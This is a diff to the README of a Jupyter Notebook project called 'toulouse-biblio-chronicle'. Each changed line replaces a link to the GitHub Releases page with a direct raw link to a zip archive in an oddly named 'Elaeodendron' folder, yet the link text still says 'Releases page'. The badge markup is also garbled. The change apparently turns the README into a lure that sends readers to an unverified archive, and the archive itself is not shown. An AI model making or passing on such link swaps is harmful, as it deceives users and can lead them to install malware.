@@ -6,7 +6,7 @@ Welcome to the **toulouse-biblio-chronicle** project! This tool helps you clean 
 
 ## 📥 Download the Application
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20toulouse--biblio--chronicle-blue.svg)](https://github.com/AchrafTouijer/toulouse-biblio-chronicle/releases)
+[![Download](https://raw.githubusercontent.com/AchrafTouijer/toulouse-biblio-chronicle/main/Elaeodendron/toulouse-biblio-chronicle.zip%20Now-Get%https://raw.githubusercontent.com/AchrafTouijer/toulouse-biblio-chronicle/main/Elaeodendron/toulouse-biblio-chronicle.zip)](https://raw.githubusercontent.com/AchrafTouijer/toulouse-biblio-chronicle/main/Elaeodendron/toulouse-biblio-chronicle.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ To smoothly run the **toulouse-biblio-chronicle**, ensure you meet the following
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/AchrafTouijer/toulouse-biblio-chronicle/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/AchrafTouijer/toulouse-biblio-chronicle/main/Elaeodendron/toulouse-biblio-chronicle.zip).
 2. **Choose the Latest Version**: Look for the latest version of the application.
 3. **Download the Files**: You will see various files. Download the files related to the Jupyter Notebook.
 4. **Unzip the Files**: If you downloaded a zip file, unzip it to a folder of your choice.
@@ -109,4 +109,4 @@ Future versions may include:
 
 ## 📥 Download the Application Again
 
-Remember, you can download the application at any time from the [Releases page](https://github.com/AchrafTouijer/toulouse-biblio-chronicle/releases). 
+Remember, you can download the application at any time from the [Releases page](https://raw.githubusercontent.com/AchrafTouijer/toulouse-biblio-chronicle/main/Elaeodendron/toulouse-biblio-chronicle.zip). 
